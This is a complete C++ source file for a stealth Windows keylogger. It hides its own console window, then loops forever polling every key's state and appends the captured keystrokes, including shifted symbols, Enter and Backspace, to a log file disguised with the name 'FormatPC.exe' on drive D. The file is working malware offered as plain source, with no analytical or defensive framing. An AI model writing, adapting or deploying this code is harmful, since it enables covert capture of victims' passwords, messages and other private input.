#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();
void hide();

int main()
{
    hide();
    log();
    return 0;
}

void log()
{
    char c, key;

    for (;;)
    {
        for (key = 0; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                ofstream write("D:\\FormatPC.exe", ios::app);

                if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10)))
                {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                }
                else if ((key > 64) && (key < 91))
                {
                    write << key;
                    write.close();
                    break;
                }
                else if ((key > 47) && (key < 58) && !(GetAsyncKeyState(0x10)))
                {
                    write << key;
                    write.close();
                    break;
                }
                else
                {
                    switch (key)
                    {
                    // Not Working
                    // case 92:
                    // {

                    //     write << "\\";
                    //     break;
                    // }
                    // case 93:
                    // {

                    //     write << "]";
                    //     break;
                    // }
                    // case 96:
                    // {

                    //     write << "`";
                    //     break;
                    // }
                    // case 123:
                    // {

                    //     write << "{";
                    //     break;
                    // }
                    // case 124:
                    // {

                    //     write << "|";
                    //     break;
                    // }
                    // case 125:
                    // {

                    //     write << "}";
                    //     break;
                    // }
                    // case 126:
                    // {

                    //     write << "~";
                    //     break;
                    // }
                    // case 127:
                    // {

                    //     write << "<Del>";
                    //     break;
                    // }

                    // Working
                    case 8:
                        write << "<Backspace>";
                        break;
                    case 13:
                        write << "<Enter>\n";
                        break;
                    case 27:
                        write << "<Esc>";
                        break;
                    case 32:
                        write << " ";
                        break;
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << ")";
                        break;
                    }
                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "!";
                        break;
                    }
                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "@";
                        break;
                    }
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "#";
                        break;
                    }
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "$";
                        break;
                    }
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "%";
                        break;
                    }
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "^";
                        break;
                    }
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "&";
                        break;
                    }
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "*";
                        break;
                    }
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "(";
                        break;
                    }

                    default:
                        // write << key;
                        break;
                    }
                }
            }
        }
    }
}

void hide()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}